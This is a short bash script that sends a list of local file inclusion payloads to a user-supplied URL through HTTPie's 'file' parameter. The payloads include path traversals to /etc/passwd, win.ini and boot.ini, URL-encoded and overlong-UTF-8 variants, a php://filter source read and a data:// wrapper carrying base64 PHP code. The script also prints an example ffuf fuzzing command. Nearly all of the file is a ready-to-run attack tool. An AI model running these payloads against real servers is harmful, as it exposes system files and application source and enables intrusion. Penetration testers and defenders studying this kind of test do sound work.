#!/bin/bash
# lfi_httpie_test.sh
# Description: LFI test script using HTTPie

TARGET_URL=$1

LFI_PAYLOADS=(
    "../../../../etc/passwd" "../../../../../../../../../../etc/passwd" "../windows/win.ini" "../../../../../../../../../../boot.ini" "..%2f..%2f..%2f..%2fetc%2fpasswd" "..\..\..\..\..\..\..\windows\win.ini" "....//....//....//etc/passwd" "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" "php://filter/convert.base64-encode/resource=index.php" "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
)

echo "[*] Starting LFI tests with HTTPie on $TARGET_URL"

for payload in "${LFI_PAYLOADS[@]}"; do
    echo -e "\n[*] Testing payload: $payload"
    http --ignore-stdin "$TARGET_URL?file=$payload"
done

echo -e "\n[*] Example ffuf usage for LFI fuzzing:"
echo 'ffuf -u "$TARGET_URL?file=FUZZ" -w lfi_payloads.txt -mc all'
